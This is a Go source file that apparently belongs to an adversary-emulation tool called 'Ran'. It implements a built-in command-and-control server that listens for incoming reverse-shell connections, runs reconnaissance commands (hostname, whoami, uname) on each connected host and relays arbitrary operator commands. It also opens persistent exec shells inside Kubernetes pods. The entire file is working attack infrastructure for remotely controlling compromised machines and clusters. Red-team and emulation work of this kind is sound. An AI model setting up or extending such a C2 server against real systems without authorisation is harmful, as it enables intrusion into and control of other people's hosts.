package c2

import (
	"bufio"
	"context"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/Magier/Ran/domain"
	k8s "github.com/Magier/Ran/k8sclient"
)

var builtinC2Mutex sync.Mutex

const builtinKind = "Ran"

type BuiltInC2Server struct {
	cmdChannel  chan domain.Command
	ip          net.IP
	isReady     bool
	eventStream chan domain.Event
	sessions    map[string]Session
	cancel      context.CancelFunc
	wg          sync.WaitGroup
}

type Session interface {
	GetID() string
	SendCommand(cmd string) (string, error)
	Start(ctx context.Context)
	End()
	// ID         string
	// conn       net.Conn
	// cmdChannel chan string
	// results    chan any
}

type RawSession struct {
	ID         string
	conn       net.Conn
	cmdChannel chan string
	results    chan any
}

func (s RawSession) GetID() string {
	return s.ID
}

func (s RawSession) Start(ctx context.Context) {
	defer s.End()
	slog.Debug("C2", "", "Handling session")

	_, err := s.SendCommand("unset PS1") // turn off the custom prompt
	if err != nil {
		slog.Error("Error unsetting PS1: " + err.Error())
		return
	}

	hostname, err := s.SendCommand("hostname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	user, err := s.SendCommand("whoami")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	os, err := s.SendCommand("uname")
	if err != nil {
		return
		// slog.Error("Error reading from connection: " + err.Error())
	}
	s.results <- SessionStarted{
		C2Kind: builtinKind,
		Session: domain.Session{
			Id:       s.ID,
			Hostname: hostname,
			Os:       os,
			User:     user,
		}}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			cmd := <-s.cmdChannel
			res, err := s.SendCommand(cmd)
			if err != nil {
				slog.Error("Coulnd't send command", "cmd", cmd, "error", err)
			}
			slog.Debug("Received data: " + string(res))
			s.results <- res
		}
	}
}

func (s RawSession) SendCommand(cmd string) (string, error) {
	writer := bufio.NewWriter(s.conn)
	// _, err := conn.Write([]byte(cmd))
	slog.Debug("Sent command: ", "cmd", cmd)
	if _, err := writer.WriteString(cmd + "\n"); err != nil {
		slog.Error("Error sending command: " + err.Error())
		return "", err
	}
	writer.Flush()
	// raw_result := make([]byte, 1024)
	reader := bufio.NewReader(s.conn)
	str, err := reader.ReadString('\n') // maybe use scanner instead?
	slog.Debug("Rx Simple IO:", str, "")
	if err != nil {
		slog.Error(fmt.Sprintf("Error receiving response for command '%s': %s", cmd, err.Error()))
		return "", err
	}
	return strings.Trim(str, "\n"), nil
}

func NewRawSession(id string, conn net.Conn) (Session, error) {
	return RawSession{
		ID:         id,
		conn:       conn,
		cmdChannel: make(chan string),
		results:    make(chan any),
	}, nil
}

func (s RawSession) End() {
	s.conn.Close()
	close(s.results)
}

var _ C2Client = (*BuiltInC2Server)(nil)

func NewBuiltInServer() *BuiltInC2Server {
	ip := GetOutboundIP()
	return &BuiltInC2Server{
		sessions:    make(map[string]Session),
		cmdChannel:  make(chan domain.Command, 1),
		ip:          ip,
		isReady:     false,
		eventStream: make(chan domain.Event, 1),
	}
}

func (c *BuiltInC2Server) Connect(parentCtx context.Context) error {
	c.eventStream <- domain.C2Connected{
		Name: BuiltInC2,
		IP:   c.GetServerIp(),
		Kind: "C2",
	}
	ctx, cancel := context.WithCancel(parentCtx)
	c.cancel = cancel

	c.wg.Add(1)
	go c.runDispatchLoop(ctx)
	return nil
}

// runDispatchLoop multiplexes between:
// - ctx cancellation
// - incoming commands (c.cmdChannel)
// It returns when ctx is cancelled or when the server events channel closes.
func (c *BuiltInC2Server) runDispatchLoop(
	ctx context.Context,
) {
	defer c.wg.Done()

	for {
		select {
		case <-ctx.Done():
			return

		case cmd, ok := <-c.cmdChannel:
			if !ok {
				c.cmdChannel = nil
				continue
			}
			event, err := c.handleCommand(cmd)
			if err != nil {
				slog.Error("Sliver C2: could not send cmd", "err", err)
			}
			if event != nil {
				select {
				case <-ctx.Done():
					return
				case c.eventStream <- event:
				}
			}

			// case evt, ok := <-events:
			// 	if !ok {
			// 		// Server event stream ended; stop the loop.
			// 		return
			// 	}
			// 	// go c.handleServerEvent(c.eventStream, evt)
		}
	}
}

func (c *BuiltInC2Server) Shutdown() {
	if c.cancel != nil {
		c.cancel()
	}
	close(c.cmdChannel)
	c.wg.Wait()
}

func (c *BuiltInC2Server) SetReady(state bool) C2Client {
	c.isReady = state
	return c
}

func (c *BuiltInC2Server) GetEventStream() <-chan domain.Event {
	return c.eventStream
}

func (c *BuiltInC2Server) IsReady() bool {
	builtinC2Mutex.Lock()
	defer builtinC2Mutex.Unlock()
	return c.isReady
}

func (c *BuiltInC2Server) Execute(ev domain.Command) (domain.Message, error) {
	c.cmdChannel <- ev
	return nil, nil
}

func (c *BuiltInC2Server) GetServerIp() net.IP {
	return c.ip
}

func (c *BuiltInC2Server) handleCommand(msg domain.Command) (domain.Event, error) {
	switch cmd := msg.(type) {
	case domain.StartListener:
		go func() {
			// TODO handle disconnecting listener
			err := c.startListener(context.Background(), cmd)
			if err != nil {
				c.eventStream <- TTPExecuted{
					EventImpl: domain.EventImpl{
						CmdId: cmd.ID,
					},
					ID:      msg.GetID(),
					Success: false,
					Results: []string{err.Error()},
				}
			}
		}()
	case domain.StopListener:
		err := c.stopListener(cmd)
		return nil, err
	default:
		return nil, nil
	}
	// TODO: Forward the command to the respective session
	return nil, nil
}

func (c *BuiltInC2Server) GetName() string {
	return ""
}

func (c *BuiltInC2Server) startListener(ctx context.Context, cmd domain.StartListener) error {
	listener, err := net.Listen("tcp", ":"+strconv.FormatUint(uint64(cmd.Port), 10))
	if err != nil {
		return fmt.Errorf("Unable to bind to port: %s", err)
	}
	defer listener.Close()

	listenerId := fmt.Sprintf("builtin_%s", cmd.Protocol)
	c.eventStream <- ListenerReady{
		EventImpl: domain.EventImpl{CmdId: cmd.ID},
		Name:      fmt.Sprintf("%s_%d", listenerId, cmd.Port),
		IP:        c.GetServerIp(),
		C2Name:    BuiltInC2,
		Port:      cmd.Port,
		Protocol:  domain.TCP,
	}
	numSessions := 0

	for {
		select {
		case <-ctx.Done():
			slog.InfoContext(ctx, "Shutting down listener")
			return nil
		default:
			// Accept incoming connections
			conn, err := listener.Accept()
			if err != nil {
				slog.Error(err.Error())
				continue
			}

			sessionID := "krill_" + strconv.Itoa(numSessions+1)
			session, err := NewRawSession(sessionID, conn)
			if err != nil {
				slog.Error("Could not create new C2 session: " + err.Error())
			} else {
				c.sessions[sessionID] = session
				numSessions++

				// Handle client connection in a goroutine
				// in := make(chan string, 5)
				// out := make(chan string, 5)
				go session.Start(ctx)
				defer session.End()

				rawSession := session.(RawSession)
				for result := range rawSession.results {
					switch r := result.(type) {
					case string:
						// TODO: fix this
						c.eventStream <- TTPExecuted{
							Results: []string{r},
						}
					case domain.Event:
						c.eventStream <- r
					}
				}
			}
		}
	}
}
func (c *BuiltInC2Server) stopListener(cmd domain.StopListener) error {
	return fmt.Errorf("Stopping builtin listener is not yet implemented!")
}

type PodExecSession struct {
	ID         string
	Namespace  string
	PodName    string
	CmdChan    chan string
	OutputChan chan string
	results    chan any
	client     *k8s.K8sClient
}

func (s PodExecSession) GetID() string {
	return s.ID
}

func (s PodExecSession) SendCommand(cmd string) (string, error) {
	select {
	case s.CmdChan <- cmd:
		return "", nil
	default:
		return "", fmt.Errorf("command channel is full or closed")
	}
}

func (s PodExecSession) Start(ctx context.Context) {
	defer s.End()

	slog.Info("Opening persistent shell session", "namespace", s.Namespace, "pod", s.PodName)

	// Send initial session info
	hostname := s.PodName
	user := "unknown"
	os := "kubernetes"

	s.results <- SessionStarted{
		C2Kind: builtinKind,
		Session: domain.Session{
			Id:       s.ID,
			Hostname: hostname,
			Os:       os,
			User:     user,
		},
	}

	// Start output processing goroutine
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case output, ok := <-s.OutputChan:
				if !ok {
					return
				}
				slog.Debug("Received output from pod", "output", output)
				// Send output to results channel (non-blocking)
				select {
				case s.results <- output:
				case <-ctx.Done():
					return
				}
			}
		}
	}()

	// Start the persistent shell session (blocks until session ends)
	err := k8s.PersistentExec(ctx, *s.client, s.PodName, s.Namespace, s.CmdChan, s.OutputChan)
	if err != nil {
		slog.Error("Shell session failed", "error", err)
		s.results <- fmt.Sprintf("Session error: %v", err)
	}
	slog.Info("Shell session closed", "session", s.ID)
}

func (s PodExecSession) End() {
	close(s.CmdChan)
	close(s.results)
}

func (c *BuiltInC2Server) EstablishPodExecShell(ctx context.Context, namespace, podName string) error {
	id := "podexec_" + podName + "_" + namespace

	client, err := k8s.NewK8sClient("")
	if err != nil {
		slog.Error("Failed to create K8s client", "error", err)
		return err
	}

	s := PodExecSession{
		ID:         id,
		Namespace:  namespace,
		PodName:    podName,
		CmdChan:    make(chan string, 10),   // Buffered to prevent blocking
		OutputChan: make(chan string, 100),  // Buffered for output
		results:    make(chan any, 10),      // Buffered for results
		client:     &client,
	}

	// Register session
	c.sessions[id] = s

	// Start the session in a goroutine
	go s.Start(ctx)

	// Process results and forward to event stream
	go func() {
		for result := range s.results {
			switch r := result.(type) {
			case string:
				// Forward command output
				select {
				case c.eventStream <- TTPExecuted{
					ID:      id,
					Success: true,
					Results: []string{r},
				}:
				case <-ctx.Done():
					return
				}
			case domain.Event:
				// Forward session events (like SessionStarted)
				select {
				case c.eventStream <- r:
				case <-ctx.Done():
					return
				}
			}
		}
	}()

	return nil
}
